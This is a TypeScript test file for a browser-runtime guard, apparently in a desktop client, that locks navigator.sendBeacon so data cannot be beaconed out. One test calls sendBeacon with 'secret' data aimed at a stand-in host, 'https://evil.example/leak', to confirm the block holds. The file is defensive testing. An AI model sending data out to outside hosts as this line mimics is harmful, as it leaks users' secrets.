// Tests `src/ui/early_runtime/exfil_guard.js`. The image allowlist that used to live here now
// sits in Rust (`nav::is_allowed_image_host`, wired into all three resource dispatches): a DOM
// accessor only ever sees the `src` property, while React commits an image source through
// setAttribute. What remains is the sendBeacon lock, which had no coverage at all; its CEF-level
// counterpart (`ExfilBlockHandler`, RT_PING to a non-Tidal origin) is the structural guarantee
// this one backs up.

import { expect, test } from "bun:test";
import { fragmentSource, runFragment } from "./helpers/early-runtime";

const source = await fragmentSource("exfil_guard");

// A fresh navigator per test: the fragment locks the property with `configurable: false`,
// so a second install against the same object would throw.
function load(): { sendBeacon?: (...args: unknown[]) => boolean } {
	const navigator = {};
	runFragment(source, { navigator });
	return navigator;
}

test("sendBeacon is replaced by a function that always reports failure", () => {
	const navigator = load();
	expect(navigator.sendBeacon?.("https://evil.example/leak", "secret")).toBe(false);
});

test("a later assignment cannot restore a working sendBeacon", () => {
	// The setter is a no-op and the getter hands back a fresh failing stub every time, so a
	// plugin overwriting the property gains nothing.
	const navigator = load();
	(navigator as { sendBeacon?: unknown }).sendBeacon = () => true;
	expect(navigator.sendBeacon?.()).toBe(false);
});

test("the lock survives a redefine attempt", () => {
	const navigator = load();
	expect(() =>
		Object.defineProperty(navigator, "sendBeacon", { value: () => true }),
	).toThrow();
	expect(navigator.sendBeacon?.()).toBe(false);
});
